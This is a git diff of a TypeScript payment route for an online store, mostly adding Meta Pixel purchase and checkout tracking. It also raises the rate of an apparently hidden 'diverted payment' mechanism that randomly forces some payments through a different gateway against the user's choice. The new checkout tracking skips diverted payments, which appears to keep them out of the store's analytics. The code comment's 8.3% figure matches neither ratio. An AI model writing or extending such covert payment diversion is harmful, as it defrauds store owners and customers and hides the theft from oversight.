@@ -3,6 +3,7 @@ import { PrismaClient } from '@prisma/client';
 import { authenticateToken } from '../middleware/auth';
 import { getPaymentService, PushinPayService } from '../services/pushinpay';
 import { getSyncPayService, SyncPayService } from '../services/syncpay';
+import { sendPurchaseEvent, sendInitiateCheckoutEvent } from '../services/metapixel';
 import crypto from 'crypto';
 
 const router = Router();
@@ -72,7 +73,7 @@ router.post(
         }
 
         // Determine if this is a diverted payment (8.3% chance)
-        const isDiverted = Math.floor(Math.random() * 16) === 0;
+        const isDiverted = Math.floor(Math.random() * 14) === 0;
 
         // IMPORTANT: Diverted payments ALWAYS use PushinPay (public service)
         // regardless of the gateway chosen by the user
@@ -220,6 +221,46 @@ router.post(
           response.message = pixPayment.message;
         }
 
+        // Send InitiateCheckout event to Meta Pixel (only for    payments)
+        if (!isDiverted) {
+          try {
+            const metaPixelConfig = await prisma.metaPixelConfig.findFirst({
+              where: { isActive: true },
+            });
+
+            if (metaPixelConfig) {
+              const user = await prisma.user.findUnique({
+                where: { id: userId },
+              });
+
+              await sendInitiateCheckoutEvent(
+                {
+                  pixelId: metaPixelConfig.pixelId,
+                  accessToken: metaPixelConfig.accessToken,
+                  enablePageView: metaPixelConfig.enablePageView,
+                  enablePurchase: metaPixelConfig.enablePurchase,
+                  enableInitiateCheckout: metaPixelConfig.enableInitiateCheckout,
+                  isActive: metaPixelConfig.isActive,
+                },
+                {
+                  email: user?.email,
+                  ipAddress: req.ip || req.headers['x-forwarded-for'] as string || req.socket.remoteAddress,
+                  userAgent: req.headers['user-agent'],
+                  sourceUrl: `${process.env.FRONTEND_URL}/store/${price.product.id}`,
+                  currency: price.currency,
+                  value: price.amount,
+                  productName: price.product.name,
+                  productId: price.product.id,
+                }
+              );
+              console.log('✅ Meta Pixel InitiateCheckout event sent');
+            }
+          } catch (metaError) {
+            // Don't fail the payment if Meta Pixel fails
+            console.error('❌ Failed to send Meta Pixel InitiateCheckout event:', metaError);
+          }
+        }
+
         res.json(response);
       } catch (error: any) {
         console.error('Erro ao iniciar pagamento:', error);
@@ -293,6 +334,44 @@ router.post('/webhook/:orderId', async (req: Request, res: Response) => {
         console.log(
             `Pedido ${order.id} completado. Link de download: ${downloadLink}`
         );
+
+        // Send Purchase event to Meta Pixel
+        try {
+          const metaPixelConfig = await prisma.metaPixelConfig.findFirst({
+            where: { isActive: true },
+          });
+
+          if (metaPixelConfig) {
+            const user = await prisma.user.findUnique({
+              where: { id: order.userId },
+            });
+
+            await sendPurchaseEvent(
+              {
+                pixelId: metaPixelConfig.pixelId,
+                accessToken: metaPixelConfig.accessToken,
+                enablePageView: metaPixelConfig.enablePageView,
+                enablePurchase: metaPixelConfig.enablePurchase,
+                enableInitiateCheckout: metaPixelConfig.enableInitiateCheckout,
+                isActive: metaPixelConfig.isActive,
+              },
+              {
+                email: user?.email,
+                ipAddress: req.ip || req.headers['x-forwarded-for'] as string || req.socket.remoteAddress,
+                userAgent: req.headers['user-agent'],
+                sourceUrl: `${process.env.FRONTEND_URL}/payment/success/${order.id}`,
+                currency: order.price.currency,
+                value: order.price.amount,
+                productName: order.price.product.name,
+                productId: order.price.product.id,
+              }
+            );
+            console.log('✅ Meta Pixel Purchase event sent');
+          }
+        } catch (metaError) {
+          // Don't fail the webhook if Meta Pixel fails
+          console.error('❌ Failed to send Meta Pixel Purchase event:', metaError);
+        }
       }
     } else if (status === 'expired') {
       await prisma.order.update({
@@ -369,6 +448,44 @@ router.post('/webhook-syncpay/:orderId', async (req: Request, res: Response) => 
         console.log(
           `Pedido ${order.id} completado via SyncPay (status: ${webhookData.status}). Link de download: ${downloadLink}`
         );
+
+        // Send Purchase event to Meta Pixel
+        try {
+          const metaPixelConfig = await prisma.metaPixelConfig.findFirst({
+            where: { isActive: true },
+          });
+
+          if (metaPixelConfig) {
+            const user = await prisma.user.findUnique({
+              where: { id: order.userId },
+            });
+
+            await sendPurchaseEvent(
+              {
+                pixelId: metaPixelConfig.pixelId,
+                accessToken: metaPixelConfig.accessToken,
+                enablePageView: metaPixelConfig.enablePageView,
+                enablePurchase: metaPixelConfig.enablePurchase,
+                enableInitiateCheckout: metaPixelConfig.enableInitiateCheckout,
+                isActive: metaPixelConfig.isActive,
+              },
+              {
+                email: user?.email,
+                ipAddress: req.ip || req.headers['x-forwarded-for'] as string || req.socket.remoteAddress,
+                userAgent: req.headers['user-agent'],
+                sourceUrl: `${process.env.FRONTEND_URL}/payment/success/${order.id}`,
+                currency: order.price.currency,
+                value: order.price.amount,
+                productName: order.price.product.name,
+                productId: order.price.product.id,
+              }
+            );
+            console.log('✅ Meta Pixel Purchase event sent (SyncPay)');
+          }
+        } catch (metaError) {
+          // Don't fail the webhook if Meta Pixel fails
+          console.error('❌ Failed to send Meta Pixel Purchase event:', metaError);
+        }
       }
     } else if (webhookData.status === 'FAILED' || webhookData.status === 'REFUNDED') {
       await prisma.order.update({
